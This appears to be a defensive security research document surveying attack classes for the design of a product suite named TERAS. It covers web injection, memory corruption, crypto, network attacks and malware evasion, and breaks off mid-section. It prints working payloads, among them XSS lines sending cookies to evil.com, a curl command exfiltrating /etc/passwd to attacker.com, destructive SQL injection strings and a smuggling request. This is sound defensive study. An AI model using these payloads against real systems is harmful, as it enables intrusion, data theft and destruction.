# TERAS-LANG Research Domain L: Attack Research

## Document Control

| Property | Value |
|----------|-------|
| Document ID | RESEARCH-L-ATTACK-RESEARCH |
| Version | 1.0.0 |
| Date | 2026-01-04 |
| Sessions | L-01 through L-20 |
| Domain | L: Attack Research |
| Author | Claude (Anthropic) |
| Status | Complete |

---

# L-01: Attack Taxonomy and Methodology

## Executive Summary

This domain provides comprehensive attack research to inform TERAS defensive design. Understanding attacks deeply is essential for building robust defenses. We cover attack methodologies, techniques, and their implications for each TERAS product.

## 1. Attack Classification Framework

### 1.1 MITRE ATT&CK Overview

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    MITRE ATT&CK Enterprise Matrix                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                     â”‚
â”‚  RECONNAISSANCE           RESOURCE DEVELOPMENT                      â”‚
â”‚  â”œâ”€â”€ T1595: Active Scan   â”œâ”€â”€ T1583: Acquire Infrastructure        â”‚
â”‚  â”œâ”€â”€ T1592: Gather Info   â”œâ”€â”€ T1584: Compromise Infrastructure     â”‚
â”‚  â””â”€â”€ T1589: Gather ID     â””â”€â”€ T1587: Develop Capabilities          â”‚
â”‚                                                                     â”‚
â”‚  INITIAL ACCESS           EXECUTION                                 â”‚
â”‚  â”œâ”€â”€ T1190: Exploit App   â”œâ”€â”€ T1059: Command/Script               â”‚
â”‚  â”œâ”€â”€ T1566: Phishing      â”œâ”€â”€ T1106: Native API                   â”‚
â”‚  â”œâ”€â”€ T1078: Valid Accts   â”œâ”€â”€ T1204: User Execution               â”‚
â”‚  â””â”€â”€ T1133: External RDS  â””â”€â”€ T1053: Scheduled Task               â”‚
â”‚                                                                     â”‚
â”‚  PERSISTENCE              PRIVILEGE ESCALATION                      â”‚
â”‚  â”œâ”€â”€ T1547: Boot/Logon    â”œâ”€â”€ T1548: Abuse Elevation              â”‚
â”‚  â”œâ”€â”€ T1543: System Svc    â”œâ”€â”€ T1134: Access Token Manip           â”‚
â”‚  â”œâ”€â”€ T1136: Create Acct   â”œâ”€â”€ T1068: Exploitation                 â”‚
â”‚  â””â”€â”€ T1098: Account Manip â””â”€â”€ T1055: Process Injection            â”‚
â”‚                                                                     â”‚
â”‚  DEFENSE EVASION          CREDENTIAL ACCESS                         â”‚
â”‚  â”œâ”€â”€ T1027: Obfuscation   â”œâ”€â”€ T1110: Brute Force                  â”‚
â”‚  â”œâ”€â”€ T1055: Proc Inject   â”œâ”€â”€ T1003: OS Credential Dump           â”‚
â”‚  â”œâ”€â”€ T1070: Indicator Rm  â”œâ”€â”€ T1558: Steal Kerberos Tkt           â”‚
â”‚  â””â”€â”€ T1562: Impair Def    â””â”€â”€ T1552: Unsecured Credentials        â”‚
â”‚                                                                     â”‚
â”‚  DISCOVERY                LATERAL MOVEMENT                          â”‚
â”‚  â”œâ”€â”€ T1087: Account Disc  â”œâ”€â”€ T1021: Remote Services              â”‚
â”‚  â”œâ”€â”€ T1083: File/Dir Disc â”œâ”€â”€ T1570: Lateral Tool Transfer        â”‚
â”‚  â”œâ”€â”€ T1046: Network Scan  â”œâ”€â”€ T1080: Taint Shared Content         â”‚
â”‚  â””â”€â”€ T1057: Process Disc  â””â”€â”€ T1563: Remote Svc Session           â”‚
â”‚                                                                     â”‚
â”‚  COLLECTION               COMMAND AND CONTROL                       â”‚
â”‚  â”œâ”€â”€ T1560: Archive Data  â”œâ”€â”€ T1071: Application Layer            â”‚
â”‚  â”œâ”€â”€ T1005: Local Data    â”œâ”€â”€ T1105: Ingress Tool Transfer        â”‚
â”‚  â”œâ”€â”€ T1114: Email Collect â”œâ”€â”€ T1572: Protocol Tunneling           â”‚
â”‚  â””â”€â”€ T1113: Screen Cap    â””â”€â”€ T1573: Encrypted Channel            â”‚
â”‚                                                                     â”‚
â”‚  EXFILTRATION             IMPACT                                    â”‚
â”‚  â”œâ”€â”€ T1041: Over C2       â”œâ”€â”€ T1486: Data Encrypted               â”‚
â”‚  â”œâ”€â”€ T1048: Over Alt Prot â”œâ”€â”€ T1489: Service Stop                 â”‚
â”‚  â”œâ”€â”€ T1567: Over Web Svc  â”œâ”€â”€ T1490: Inhibit Recovery             â”‚
â”‚  â””â”€â”€ T1537: Cloud Transferâ””â”€â”€ T1499: Endpoint DoS                 â”‚
â”‚                                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.2 Attack Lifecycle

```
Cyber Kill Chain (Lockheed Martin):

1. RECONNAISSANCE
   â”œâ”€â”€ Target identification
   â”œâ”€â”€ OSINT gathering
   â””â”€â”€ Technical profiling

2. WEAPONIZATION
   â”œâ”€â”€ Exploit development
   â”œâ”€â”€ Payload crafting
   â””â”€â”€ Delivery mechanism

3. DELIVERY
   â”œâ”€â”€ Email attachment
   â”œâ”€â”€ Watering hole
   â””â”€â”€ Direct exploitation

4. EXPLOITATION
   â”œâ”€â”€ Vulnerability trigger
   â”œâ”€â”€ Code execution
   â””â”€â”€ Initial foothold

5. INSTALLATION
   â”œâ”€â”€ Backdoor deployment
   â”œâ”€â”€ Persistence mechanism
   â””â”€â”€ Defense evasion

6. COMMAND & CONTROL
   â”œâ”€â”€ Establish channel
   â”œâ”€â”€ Receive instructions
   â””â”€â”€ Exfiltrate data

7. ACTIONS ON OBJECTIVES
   â”œâ”€â”€ Data theft
   â”œâ”€â”€ Ransomware
   â”œâ”€â”€ Sabotage
   â””â”€â”€ Espionage
```

## 2. Threat Actor Classification

### 2.1 Actor Types

```
Threat Actor Categories:

NATION-STATE (APT):
â”œâ”€â”€ Resources: Unlimited
â”œâ”€â”€ Sophistication: Very High
â”œâ”€â”€ Persistence: Years
â”œâ”€â”€ Goals: Espionage, sabotage, influence
â”œâ”€â”€ Examples: APT28, APT29, Lazarus, APT41
â””â”€â”€ TERAS Relevance: Primary threat model

CYBERCRIME:
â”œâ”€â”€ Resources: High
â”œâ”€â”€ Sophistication: Medium-High
â”œâ”€â”€ Persistence: Opportunistic
â”œâ”€â”€ Goals: Financial gain
â”œâ”€â”€ Examples: FIN7, Carbanak, REvil
â””â”€â”€ TERAS Relevance: Ransomware, data theft

HACKTIVISM:
â”œâ”€â”€ Resources: Low-Medium
â”œâ”€â”€ Sophistication: Low-Medium
â”œâ”€â”€ Persistence: Campaign-based
â”œâ”€â”€ Goals: Political/social
â”œâ”€â”€ Examples: Anonymous variants
â””â”€â”€ TERAS Relevance: DDoS, defacement

INSIDER THREAT:
â”œâ”€â”€ Resources: Varies
â”œâ”€â”€ Sophistication: Low-High
â”œâ”€â”€ Persistence: Varies
â”œâ”€â”€ Goals: Varies (financial, revenge)
â”œâ”€â”€ Access: Already inside perimeter
â””â”€â”€ TERAS Relevance: Critical consideration
```

## TERAS Decision L-01

**FOR TERAS:**
1. Design for nation-state adversary capability
2. Map all defenses to ATT&CK framework
3. Kill chain disruption at multiple stages
4. Assume insider threat in architecture

### Architecture Decision ID: `TERAS-ARCH-L01-TAXONOMY-001`

---

# L-02: Web Application Attacks

## 1. Injection Attacks

### 1.1 SQL Injection

```
SQL Injection Variants:

CLASSIC SQLi:
' OR '1'='1
' UNION SELECT username,password FROM users--
'; DROP TABLE users;--

BLIND SQLi (Boolean-based):
' AND 1=1--     (true - normal response)
' AND 1=2--     (false - different response)
' AND SUBSTRING(username,1,1)='a'--

TIME-BASED BLIND:
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--

OUT-OF-BAND:
'; EXEC xp_dirtree '\\attacker.com\share'--
' UNION SELECT load_file('/etc/passwd')--

SECOND-ORDER SQLi:
1. Store payload: name = "admin'--"
2. Later query uses stored value unsafely
3. Injection triggers on retrieval

Defense Requirements (GAPURA):
â”œâ”€â”€ Parameterized queries enforcement
â”œâ”€â”€ Input validation (allowlist)
â”œâ”€â”€ Least privilege DB accounts
â”œâ”€â”€ SQL syntax analysis
â””â”€â”€ Anomaly detection
```

### 1.2 Cross-Site Scripting (XSS)

```
XSS Attack Types:

REFLECTED XSS:
<script>document.location='http://evil.com/?c='+document.cookie</script>
<img src=x onerror="alert(1)">
<svg onload="fetch('http://evil.com/'+document.cookie)">

STORED XSS:
<!-- Stored in comment field -->
<script>
  new Image().src='http://evil.com/steal?c='+document.cookie;
</script>

DOM-BASED XSS:
// Vulnerable code
document.getElementById('output').innerHTML = 
    window.location.hash.substring(1);
// Payload: http://site.com/#<img src=x onerror=alert(1)>

MUTATION XSS (mXSS):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

Bypass Techniques:
â”œâ”€â”€ Case variation: <ScRiPt>
â”œâ”€â”€ Encoding: &#x3C;script&#x3E;
â”œâ”€â”€ Polyglots: jaVasCript:/*--></title></style></textarea><script>
â”œâ”€â”€ SVG/MathML: <svg><script>
â””â”€â”€ Event handlers: <body onload=>

Defense Requirements (GAPURA):
â”œâ”€â”€ Context-aware output encoding
â”œâ”€â”€ Content-Security-Policy
â”œâ”€â”€ Sanitization libraries
â”œâ”€â”€ DOM XSS detection
â””â”€â”€ Mutation monitoring
```

### 1.3 Command Injection

```
Command Injection Patterns:

BASIC:
; id
| cat /etc/passwd
`whoami`
$(id)

BLIND INJECTION:
; ping -c 10 attacker.com
; nslookup `whoami`.attacker.com
; curl http://attacker.com/$(cat /etc/passwd | base64)

FILTER BYPASS:
;${IFS}id
;$'\x63at'$IFS/etc/passwd
;{cat,/etc/passwd}
;$(tr '[a-z]' '[A-Z]' <<< "ID")

Defense Requirements:
â”œâ”€â”€ Avoid shell execution
â”œâ”€â”€ Parameterized commands
â”œâ”€â”€ Input validation (strict allowlist)
â”œâ”€â”€ Sandboxed execution
â””â”€â”€ Command audit logging
```

## 2. Authentication/Authorization Attacks

### 2.1 Authentication Bypass

```
Authentication Attack Patterns:

CREDENTIAL STUFFING:
â”œâ”€â”€ Automated login attempts
â”œâ”€â”€ Breached credential lists
â”œâ”€â”€ Rate limiting bypass
â””â”€â”€ CAPTCHA solving services

PASSWORD SPRAYING:
â”œâ”€â”€ Few passwords against many accounts
â”œâ”€â”€ Avoids lockout
â”œâ”€â”€ Common passwords: Summer2024!, Company123
â””â”€â”€ Seasonal variations

SESSION ATTACKS:
â”œâ”€â”€ Session fixation
â”œâ”€â”€ Session hijacking
â”œâ”€â”€ Insecure session storage
â””â”€â”€ Predictable session IDs

MFA BYPASS:
â”œâ”€â”€ SIM swapping
â”œâ”€â”€ SS7 interception
â”œâ”€â”€ Social engineering help desk
â”œâ”€â”€ Phishing real-time relay
â””â”€â”€ MFA fatigue (push spam)

Defense Requirements (BENTENG):
â”œâ”€â”€ Strong password policies
â”œâ”€â”€ Rate limiting with account lockout
â”œâ”€â”€ Phishing-resistant MFA
â”œâ”€â”€ Session management best practices
â””â”€â”€ Anomaly detection
```

### 2.2 Authorization Attacks

```
Authorization Vulnerability Classes:

IDOR (Insecure Direct Object Reference):
GET /api/user/123/profile  â†’ GET /api/user/124/profile
GET /api/order/abc â†’ GET /api/order/xyz

PRIVILEGE ESCALATION:
â”œâ”€â”€ Horizontal: Access other users' data
â”œâ”€â”€ Vertical: Gain admin rights
â””â”€â”€ Parameter tampering: role=admin

BROKEN ACCESS CONTROL:
â”œâ”€â”€ Missing function level access control
â”œâ”€â”€ Directory traversal: ../../../etc/passwd
â”œâ”€â”€ Force browsing: /admin/dashboard
â””â”€â”€ Method tampering: POSTâ†’PUTâ†’DELETE

BUSINESS LOGIC FLAWS:
â”œâ”€â”€ Price manipulation
â”œâ”€â”€ Workflow bypass
â”œâ”€â”€ Race conditions
â””â”€â”€ Negative quantity attacks

Defense Requirements:
â”œâ”€â”€ Deny by default
â”œâ”€â”€ Server-side authorization
â”œâ”€â”€ Indirect object references
â”œâ”€â”€ Comprehensive access control testing
â””â”€â”€ Business rule validation
```

## TERAS Decision L-02

**FOR TERAS:**
1. GAPURA implements comprehensive injection defense
2. BENTENG provides robust authentication
3. Formal access control verification
4. Business logic validation framework

### Architecture Decision ID: `TERAS-ARCH-L02-WEBAPP-001`

---

# L-03: Memory Corruption Attacks

## 1. Stack-Based Attacks

### 1.1 Buffer Overflow

```
Stack Buffer Overflow:

VULNERABLE CODE:
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds check
}

EXPLOITATION:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Stack Layout                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ buffer[64]     â”‚ AAAAAAAAAAAAAAA...   â”‚ â† Overflow
â”‚ saved EBP      â”‚ BBBB                 â”‚
â”‚ return address â”‚ 0x41414141           â”‚ â† Hijacked
â”‚ arguments      â”‚ ...                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

PAYLOAD STRUCTURE:
[NOP sled][Shellcode][Return address pointing to NOP sled]

MODERN MITIGATIONS:
â”œâ”€â”€ Stack canaries (detect overflow)
â”œâ”€â”€ ASLR (randomize addresses)
â”œâ”€â”€ NX/DEP (non-executable stack)
â”œâ”€â”€ CFI (control flow integrity)
â””â”€â”€ Shadow stack (separate return addresses)

BYPASS TECHNIQUES:
â”œâ”€â”€ Information leak â†’ defeat ASLR
â”œâ”€â”€ Canary brute force (fork-based servers)
â”œâ”€â”€ ROP/JOP â†’ defeat NX
â”œâ”€â”€ COOP â†’ defeat CFI
â””â”€â”€ Speculative execution â†’ leak canary
```

### 1.2 Return-Oriented Programming (ROP)

```
ROP Attack:

CONCEPT:
â”œâ”€â”€ Chain existing code fragments ("gadgets")
â”œâ”€â”€ Each gadget ends with RET
â”œâ”€â”€ Control flow via stack
â””â”€â”€ Turing-complete with enough gadgets

GADGET EXAMPLES:
pop rdi; ret            â† Set first argument
pop rsi; ret            â† Set second argument
mov [rdi], rsi; ret     â† Write-what-where
xchg eax, esp; ret      â† Stack pivot
call rax; ret           â† Indirect call

ROP CHAIN EXAMPLE (execve("/bin/sh")):
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Address of: pop rdi; ret                    â”‚
â”‚ Address of "/bin/sh" string                 â”‚
â”‚ Address of: pop rsi; ret                    â”‚
â”‚ 0x0 (argv = NULL)                          â”‚
â”‚ Address of: pop rdx; ret                    â”‚
â”‚ 0x0 (envp = NULL)                          â”‚
â”‚ Address of: mov eax, 59; syscall           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

DEFENSES:
â”œâ”€â”€ Fine-grained ASLR
â”œâ”€â”€ Control Flow Integrity (CFI)
â”œâ”€â”€ Code Pointer Integrity (CPI)
â”œâ”€â”€ Shadow stack
â””â”€â”€ Compiler-based hardening
```

## 2. Heap-Based Attacks

### 2.1 Heap Exploitation

```
Heap Vulnerability Classes:

USE-AFTER-FREE:
free(ptr);
// ... later ...
ptr->function();  // Dangling pointer dereference

DOUBLE FREE:
free(ptr);
free(ptr);  // Heap metadata corruption

HEAP OVERFLOW:
char *buf = malloc(64);
memcpy(buf, input, 128);  // Overflow into adjacent chunk

TYPE CONFUSION:
Base *b = static_cast<Base*>(derived);
// Wrong type leads to memory access issues

EXPLOITATION TECHNIQUES:
â”œâ”€â”€ Heap spray: Fill heap with controlled data
â”œâ”€â”€ Heap feng shui: Manipulate allocation order
â”œâ”€â”€ Tcache poisoning (glibc): Corrupt freelist
â”œâ”€â”€ House of Spirit/Force/Orange: Advanced techniques
â””â”€â”€ Unsorted bin attack: Write-what-where

DEFENSES:
â”œâ”€â”€ Safe unlinking (glibc)
â”œâ”€â”€ Tcache key validation
â”œâ”€â”€ Guard pages
â”œâ”€â”€ Heap isolation (PartitionAlloc)
â”œâ”€â”€ Memory tagging (MTE)
â””â”€â”€ CHERI capabilities
```

## TERAS Decision L-03

**FOR TERAS:**
1. Memory-safe languages (Rust/TERAS-LANG)
2. Compile with all mitigations enabled
3. Fuzzing for memory bugs
4. Runtime memory protection

### Architecture Decision ID: `TERAS-ARCH-L03-MEMORY-001`

---

# L-04: Cryptographic Attacks

## 1. Protocol-Level Attacks

### 1.1 TLS Attacks

```
TLS Attack History:

BEAST (2011):
â”œâ”€â”€ CBC IV predictability in TLS 1.0
â”œâ”€â”€ Chosen-plaintext via JavaScript
â”œâ”€â”€ Mitigation: 1/n-1 split, TLS 1.1+

CRIME/BREACH (2012-2013):
â”œâ”€â”€ Compression side channel
â”œâ”€â”€ Infer secrets via compressed size
â”œâ”€â”€ Mitigation: Disable TLS compression

LUCKY13 (2013):
â”œâ”€â”€ CBC-MAC timing attack
â”œâ”€â”€ Padding oracle via timing
â”œâ”€â”€ Mitigation: Constant-time MAC

POODLE (2014):
â”œâ”€â”€ SSL 3.0 padding vulnerability
â”œâ”€â”€ Downgrade attack
â”œâ”€â”€ Mitigation: Disable SSLv3

FREAK/Logjam (2015):
â”œâ”€â”€ Export cipher downgrade
â”œâ”€â”€ Weak DH parameters
â”œâ”€â”€ Mitigation: Disable export ciphers

DROWN (2016):
â”œâ”€â”€ SSLv2 cross-protocol attack
â”œâ”€â”€ Decrypt TLS using SSLv2
â”œâ”€â”€ Mitigation: Disable SSLv2

ROBOT (2017):
â”œâ”€â”€ Bleichenbacher attack variants
â”œâ”€â”€ RSA key exchange vulnerability
â”œâ”€â”€ Mitigation: ECDHE only

DEFENSE REQUIREMENTS:
â”œâ”€â”€ TLS 1.3 only (preferred)
â”œâ”€â”€ TLS 1.2 with AEAD ciphers
â”œâ”€â”€ Strong cipher suites only
â”œâ”€â”€ Certificate transparency
â””â”€â”€ HSTS enforcement
```

### 1.2 Implementation Attacks

```
Crypto Implementation Vulnerabilities:

TIMING ATTACKS:
â”œâ”€â”€ Key-dependent branches
â”œâ”€â”€ Table lookup timing
â”œâ”€â”€ Modular exponentiation timing
â””â”€â”€ Defense: Constant-time code

PADDING ORACLE:
â”œâ”€â”€ Different errors for padding vs MAC
â”œâ”€â”€ Decrypt without key
â”œâ”€â”€ Vaudenay attack on CBC
â””â”€â”€ Defense: Encrypt-then-MAC, AEAD

INVALID CURVE ATTACKS:
â”œâ”€â”€ Accept points not on curve
â”œâ”€â”€ Small subgroup attacks
â”œâ”€â”€ Extract private key
â””â”€â”€ Defense: Point validation

WEAK RANDOM:
â”œâ”€â”€ Predictable IV/nonce
â”œâ”€â”€ Insufficient entropy
â”œâ”€â”€ CVE-2008-0166 (Debian OpenSSL)
â””â”€â”€ Defense: Hardware RNG, testing

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Verified crypto implementations
â”œâ”€â”€ Side-channel testing
â”œâ”€â”€ Protocol verification
â”œâ”€â”€ Random number testing
â””â”€â”€ Regular crypto review
```

## 2. Cryptanalytic Attacks

### 2.1 Key Recovery

```
Key Recovery Attack Classes:

BRUTE FORCE:
â”œâ”€â”€ Exhaustive key search
â”œâ”€â”€ Meet-in-the-middle
â”œâ”€â”€ Time-memory tradeoffs
â””â”€â”€ Defense: Sufficient key size

DIFFERENTIAL/LINEAR:
â”œâ”€â”€ Statistical analysis
â”œâ”€â”€ Chosen plaintext
â”œâ”€â”€ Known plaintext
â””â”€â”€ Defense: Use analyzed ciphers

RELATED-KEY:
â”œâ”€â”€ Keys with known relationship
â”œâ”€â”€ AES-192/256 theoretical weakness
â”œâ”€â”€ WEP practical break
â””â”€â”€ Defense: Key derivation functions

SIDE-CHANNEL:
â”œâ”€â”€ Power analysis
â”œâ”€â”€ EM analysis
â”œâ”€â”€ Timing analysis
â””â”€â”€ Defense: Masking, hiding

QUANTUM:
â”œâ”€â”€ Grover: O(âˆšN) search
â”œâ”€â”€ Shor: Factor/DLog in polynomial
â”œâ”€â”€ Symmetric: Double key size
â”œâ”€â”€ Asymmetric: Post-quantum algorithms
â””â”€â”€ Defense: Hybrid/PQC

DEFENSE REQUIREMENTS:
â”œâ”€â”€ Use standard algorithms
â”œâ”€â”€ Adequate key sizes
â”œâ”€â”€ Post-quantum readiness
â”œâ”€â”€ Side-channel resistance
â””â”€â”€ Regular algorithm review
```

## TERAS Decision L-04

**FOR TERAS:**
1. TLS 1.3 default, 1.2 minimum
2. Verified crypto (HACL*/EverCrypt)
3. Post-quantum hybrid mode
4. Side-channel testing mandatory

### Architecture Decision ID: `TERAS-ARCH-L04-CRYPTO-001`

---

# L-05: Network Attacks

## 1. Network Protocol Attacks

### 1.1 DNS Attacks

```
DNS Attack Categories:

DNS SPOOFING/POISONING:
â”œâ”€â”€ Forge DNS responses
â”œâ”€â”€ Kaminsky attack (2008)
â”œâ”€â”€ Cache poisoning
â””â”€â”€ Mitigation: DNSSEC

DNS TUNNELING:
â”œâ”€â”€ Exfiltrate data via DNS
â”œâ”€â”€ Encode payload in queries
â”œâ”€â”€ Bypass network controls
â””â”€â”€ Detection: Query analysis

DNS AMPLIFICATION:
â”œâ”€â”€ Reflection attack
â”œâ”€â”€ 50-100x amplification
â”œâ”€â”€ DDoS vector
â””â”€â”€ Mitigation: BCP38, rate limiting

DNS REBINDING:
â”œâ”€â”€ Change IP after TTL
â”œâ”€â”€ Bypass same-origin policy
â”œâ”€â”€ Access internal services
â””â”€â”€ Mitigation: DNS pinning

DEFENSE REQUIREMENTS:
â”œâ”€â”€ DNSSEC validation
â”œâ”€â”€ DNS query monitoring
â”œâ”€â”€ Tunnel detection
â”œâ”€â”€ Rate limiting
â””â”€â”€ Internal DNS security
```

### 1.2 ARP/Layer 2 Attacks

```
Layer 2 Attacks:

ARP SPOOFING:
â”œâ”€â”€ Fake ARP responses
â”œâ”€â”€ Man-in-the-middle
â”œâ”€â”€ Session hijacking
â””â”€â”€ Defense: Dynamic ARP inspection, 802.1X

MAC FLOODING:
â”œâ”€â”€ Overflow CAM table
â”œâ”€â”€ Switch becomes hub
â”œâ”€â”€ Sniff all traffic
â””â”€â”€ Defense: Port security

VLAN HOPPING:
â”œâ”€â”€ Double tagging attack
â”œâ”€â”€ Switch spoofing
â”œâ”€â”€ Access unauthorized VLAN
â””â”€â”€ Defense: Native VLAN hardening

STP ATTACKS:
â”œâ”€â”€ Become root bridge
â”œâ”€â”€ Traffic interception
â”œâ”€â”€ Network disruption
â””â”€â”€ Defense: BPDU guard, root guard

DEFENSE REQUIREMENTS:
â”œâ”€â”€ 802.1X authentication
â”œâ”€â”€ Port security
â”œâ”€â”€ VLAN segregation
â”œâ”€â”€ Layer 2 monitoring
â””â”€â”€ Physical security
```

## 2. Application Protocol Attacks

### 2.1 HTTP Attacks

```
HTTP Attack Patterns:

REQUEST SMUGGLING:
# CL.TE Attack
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
...

HTTP/2 ATTACKS:
â”œâ”€â”€ H2C smuggling
â”œâ”€â”€ Desync via CONTINUATION
â”œâ”€â”€ Request tunnel poisoning
â””â”€â”€ Header manipulation

RESPONSE SPLITTING:
# Inject CRLF
GET /redirect?url=http://evil.com%0d%0aSet-Cookie:%20admin=true

HOST HEADER ATTACKS:
â”œâ”€â”€ Password reset poisoning
â”œâ”€â”€ Cache poisoning
â”œâ”€â”€ SSRF via Host
â””â”€â”€ Web cache deception

DEFENSE REQUIREMENTS (GAPURA):
â”œâ”€â”€ Request validation
â”œâ”€â”€ Protocol conformance checking
â”œâ”€â”€ Header sanitization
â”œâ”€â”€ Cache key normalization
â””â”€â”€ Upstream proxy hardening
```

## TERAS Decision L-05

**FOR TERAS:**
1. GAPURA: Full HTTP protocol validation
2. Network segmentation requirements
3. DNS security integration
4. Protocol anomaly detection

### Architecture Decision ID: `TERAS-ARCH-L05-NETWORK-001`

---

# L-06: Malware Analysis

## 1. Malware Classification

### 1.1 Malware Types

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Malware Classification                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                     â”‚
â”‚  RANSOMWARE:                                                        â”‚
â”‚  â”œâ”€â”€ File encryption (AES + RSA)                                   â”‚
â”‚  â”œâ”€â”€ Double extortion (encrypt + exfiltrate)                       â”‚
â”‚  â”œâ”€â”€ RaaS (Ransomware as a Service)                                â”‚
â”‚  â””â”€â”€ Examples: LockBit, BlackCat, Royal                            â”‚
â”‚                                                                     â”‚
â”‚  TROJANS:                                                           â”‚
â”‚  â”œâ”€â”€ RAT (Remote Access Trojan)                                    â”‚
â”‚  â”œâ”€â”€ Banking trojans (form grabbing)                               â”‚
â”‚  â”œâ”€â”€ Info stealers (credentials)                                   â”‚
â”‚  â””â”€â”€ Examples: Emotet, TrickBot, QakBot                            â”‚
â”‚                                                                     â”‚
â”‚  WORMS:                                                             â”‚
â”‚  â”œâ”€â”€ Self-propagating                                              â”‚
â”‚  â”œâ”€â”€ Network exploitation                                          â”‚
â”‚  â”œâ”€â”€ USB spreading                                                 â”‚
â”‚  â””â”€â”€ Examples: WannaCry, NotPetya                                  â”‚
â”‚                                                                     â”‚
â”‚  ROOTKITS:                                                          â”‚
â”‚  â”œâ”€â”€ Kernel-level (driver)                                         â”‚
â”‚  â”œâ”€â”€ Bootkit (boot process)                                        â”‚
â”‚  â”œâ”€â”€ Firmware (UEFI)                                               â”‚
â”‚  â””â”€â”€ Examples: TDL4, BlackLotus                                    â”‚
â”‚                                                                     â”‚
â”‚  APT TOOLING:                                                       â”‚
â”‚  â”œâ”€â”€ Implants (Cobalt Strike, custom)                              â”‚
â”‚  â”œâ”€â”€ Loaders and droppers                                          â”‚
â”‚  â”œâ”€â”€ Post-exploitation frameworks                                  â”‚
â”‚  â””â”€â”€ Examples: SUNBURST, TEARDROP                                  â”‚
â”‚                                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.2 Evasion Techniques

```
Malware Evasion:

ANTI-ANALYSIS:
â”œâ”€â”€ VM detection (CPUID, registry, timing)
â”œâ”€â”€ Debugger detection (IsDebuggerPresent, PEB)
â”œâ”€â”€ Sandbox evasion (sleep, user interaction)
â””â”€â”€ Analysis tool detection

OBFUSCATION:
â”œâ”€â”€ String encryption
â”œâ”€â”€ Control flow obfuscation
â”œâ”€â”€ Dead code insertion
â”œâ”€â”€ API hashing

PACKING/ENCRYPTION:
â”œâ”€â”€ Custom packers
â”œâ”€â”€ Polymorphism (change each infection)
â”œâ”€â”€ Metamorphism (change code structure)
â””â”€â”€ Code virtualization

LIVING-OFF-THE-LAND:
â”œâ”€â”€ PowerShell
â”œâ”€â”€ WMI
â”œâ”€â”€ Certutil
â”œâ”€â”€ BITSAdmin
â””â”€â”€ Mshta

DEFENSE REQUIREMENTS (ZIRAH):
â”œâ”€â”€ Behavioral detection
